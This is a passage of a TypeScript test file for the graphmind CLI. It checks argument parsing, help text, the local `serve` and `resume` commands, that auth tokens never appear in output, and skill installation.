    const parsed = parseCliArgs(['serve', '--json', '--allow-control=edit', '--no-edit-input']);
    expect(parsed.flags).toMatchObject({ json: true, allowControl: 'edit', editInput: false });
    expect(defaultFlags()).toMatchObject({ json: false, allowControl: undefined, editInput: true, force: false });
    expect(parseCliArgs(['--allow-control', 'everything']).errors[0]).toContain('off, resume, inject, edit');
    expect(parseCliArgs(['wait', '--timeout', '-3']).errors[0]).toContain('--timeout');
    expect(parseCliArgs(['wait', '--timeout', 'soon']).errors[0]).toContain('--timeout');
    expect(parseCliArgs(['resume', 'p', '--output={"a":1}']).flags.output).toBe('{"a":1}');
  });
});

// -- the binary itself ----------------------------------------------------------

const BUILD_DIR = join(packageRoot, '.control-test-dist');
const CLI = join(BUILD_DIR, 'cli.js');

async function freePort(): Promise<number> {
  return await new Promise((resolve, reject) => {
    const server = createServer();
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => {
      const address = server.address();
      const port = typeof address === 'object' && address !== null ? address.port : 0;
      server.close(() => resolve(port));
    });
  });
}

function childEnv(home: string): Record<string, string> {
  const env: Record<string, string> = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (value !== undefined && !key.startsWith('GRAPHMIND')) env[key] = value;
  }
  return { ...env, GRAPHMIND_HOME: home, GRAPHMIND_TELEMETRY: '0', DO_NOT_TRACK: '1', GRAPHMIND_RETENTION: 'off' };
}

interface Spawned {
  child: ChildProcess;
  stdout: () => string;
  stderr: () => string;
  exited: Promise<number | null>;
}

function run(args: string[], env: Record<string, string>): Spawned {
  const child = spawn(process.execPath, [CLI, ...args], { env, stdio: ['ignore', 'pipe', 'pipe'] });
  let out = '';
  let err = '';
  child.stdout?.on('data', (chunk: Buffer) => {
    out += chunk.toString();
  });
  child.stderr?.on('data', (chunk: Buffer) => {
    err += chunk.toString();
  });
  const exited = new Promise<number | null>((resolve) => child.on('exit', (code) => resolve(code)));
  return { child, stdout: () => out, stderr: () => err, exited };
}

describe('the built binary', () => {
  beforeAll(() => {
    // A private build (never dist/, which other suites and the published
    // package own), so this file cannot race another suite's build.
    const config = join(packageRoot, 'tsconfig.control-test.json');
    writeFileSync(
      config,
      JSON.stringify({
        extends: './tsconfig.build.json',
        compilerOptions: { outDir: './.control-test-dist', declaration: false, declarationMap: false, sourceMap: false },
      }),
    );
    try {
      execFileSync(join(packageRoot, 'node_modules', '.bin', 'tsc'), ['-p', config], { cwd: packageRoot, stdio: 'pipe' });
    } catch (error) {
      const detail = error as { stdout?: Buffer; stderr?: Buffer };
      throw new Error(`tsc (private CLI build) failed:\n${detail.stdout?.toString() ?? ''}${detail.stderr?.toString() ?? ''}`);
    } finally {
      rmSync(config, { force: true });
    }
  }, 120_000);

  afterAll(() => {
    rmSync(BUILD_DIR, { recursive: true, force: true });
  });

  it('`graphmind --help` lists the control commands and the exit codes', async () => {
    const home = tempDir('gm-help-');
    const help = run(['--help'], childEnv(home));
    expect(await help.exited).toBe(0);
    const text = help.stdout();
    for (const command of ['pauses', 'wait', 'resume', 'skill']) expect(text).toMatch(new RegExp(`^  ${command} `, 'm'));
    expect(text).toContain('--allow-control <off|resume|inject|edit>');
    expect(text).toContain('--no-edit-input');
    expect(text).toContain('Exit codes (pauses, wait, resume):');
    expect(text).toContain('7  taken');
  });

  it('`serve --json` prints {port, url, pid, version} and never a token; `resume` works against it; the file goes on SIGTERM', async () => {
    const home = tempDir('gm-serve-');
    const port = await freePort();
    const db = join(tempDir('gm-db-'), 'g.db');
    const serve = run(['serve', '--json', '--no-open', '--port', String(port), '--db', db, '--allow-control=resume'], childEnv(home));
    cleanups.push(() => {
      serve.child.kill('SIGKILL');
    });
    await waitUntil(() => serve.stdout().includes('\n'), 'serve --json line', 15_000);
    const lines = serve.stdout().trim().split('\n');
    expect(lines).toHaveLength(1);
    const info = JSON.parse(lines[0] as string) as Record<string, unknown>;
    expect(Object.keys(info).sort()).toEqual(['pid', 'port', 'url', 'version']);
    expect(info).toMatchObject({ port, url: `http://127.0.0.1:${port}`, pid: serve.child.pid });
    const file = join(home, 'run', `serve-${port}.json`);
    expect(existsSync(file)).toBe(true);
    const token = (JSON.parse(readFileSync(file, 'utf8')) as { agentToken: string }).agentToken;

    // A real app holds a gate; the binary releases it.
    const held = await heldApp(port, { answer: 'echo' });
    await sleep(200);
    const resume = run(['resume', 'p1', '--run', held.runId, '--action', 'continue', '--port', String(port)], childEnv(home));
    expect(await resume.exited, resume.stderr()).toBe(0);
    expect(held.resumes).toHaveLength(1);
    await held.app.close();

    serve.child.kill('SIGTERM');
    expect(await serve.exited).toBe(0);
    expect(existsSync(file)).toBe(false);
    expect(existsSync(join(home, 'run', `open-${port}.html`))).toBe(false);
    // Nothing the process printed carries a token (stdout is a pipe here).
    const everything = `${serve.stdout()}${serve.stderr()}${resume.stdout()}${resume.stderr()}`;
    expect(everything).not.toContain(token);
    expect(everything).not.toMatch(/gm[va]_[0-9a-f]{32}/);
    expect(everything).not.toContain('#token=');
  }, 30_000);

  it('plain `serve` into a pipe prints the viewer URL without the #token= fragment', async () => {
    const home = tempDir('gm-serve-plain-');
    const port = await freePort();
    const db = join(tempDir('gm-db-'), 'g.db');
    const serve = run(['serve', '--no-open', '--port', String(port), '--db', db], childEnv(home));
    cleanups.push(() => {
      serve.child.kill('SIGKILL');
    });
    await waitUntil(() => serve.stdout().includes('Press Ctrl+C'), 'serve banner', 15_000);
    const text = serve.stdout();
    expect(text).toContain(`viewer   http://127.0.0.1:${port}`);
    expect(text).not.toContain('#token=');
    expect(text).not.toMatch(/gm[va]_[0-9a-f]{32}/);
    expect(text).toContain(join(home, 'run', `open-${port}.html`));
    expect(text).toContain('control  agent (graphmind resume): off');
    serve.child.kill('SIGTERM');
    expect(await serve.exited).toBe(0);
  }, 30_000);

  it('`skill --install` from the binary', async () => {
    const cwd = tempDir('gm-skill-bin-');
    const child = spawn(process.execPath, [CLI, 'skill', '--install'], { cwd, env: childEnv(tempDir('gm-h-')), stdio: 'ignore' });
    const code = await new Promise<number | null>((resolve) => child.on('exit', resolve));
    expect(code).toBe(0);
    expect(readFileSync(join(cwd, '.claude', 'skills', 'graphmind', 'SKILL.md'), 'utf8')).toContain('name: graphmind');
  });
});
